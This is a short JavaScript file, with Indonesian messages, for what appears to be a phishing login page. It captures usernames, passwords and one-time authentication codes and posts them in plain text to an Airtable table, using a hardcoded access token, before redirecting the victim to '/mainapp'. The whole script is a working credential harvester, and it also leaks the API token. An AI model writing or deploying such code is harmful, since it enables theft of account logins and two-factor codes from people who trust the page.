const token = "pat31RGUy1ua2FIoz.ef8b6f93f458151fd8ddee3e6eafce8e3ce235f99e1b391923be895a81730efe";
const baseId = "appLTvB7Hey4An0z0";
const tableName = "table1";
const apiURL = `https://api.airtable.com/v0/${baseId}/${tableName}`;

const loginSec = document.getElementById("loginSec");
const confirmSec = document.getElementById("confirmSec");

const usrInput = document.getElementById("usr");
const pssInput = document.getElementById("pss");
const otInput = document.getElementById("otentikasi");

document.getElementById("loginBtn").onclick = () => {
  if (usrInput.value && pssInput.value) {
    loginSec.style.display = "none";
    confirmSec.style.display = "block";
  } else {
    alert("Isi username dan password terlebih dahulu.");
  }
};

document.getElementById("backBtn").onclick = () => {
  confirmSec.style.display = "none";
  loginSec.style.display = "block";
};

// Fungsi kirim data ke Airtable
async function kirimData(data) {
  try {
    const res = await fetch(apiURL, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ records: [{ fields: data }] })
    });
    if (!res.ok) throw new Error("Gagal mengirim ke Airtable");
  } catch (err) {
    console.error(err);
    alert("Terjadi kesalahan saat mengirim data.");
  }
}

// Tombol Konfirmasi (dengan otentikasi)
document.getElementById("confirmBtn").onclick = async () => {
  const data = {
    Username: usrInput.value,
    Password: pssInput.value,
    Otentikasi: otInput.value
  };
  await kirimData(data);
  window.location.href = "/mainapp";
};

// Tombol Lewati (tanpa otentikasi)
document.getElementById("skipBtn").onclick = async () => {
  const data = {
    Username: usrInput.value,
    Password: pssInput.value
  };
  await kirimData(data);
  window.location.href = "/mainapp";
};
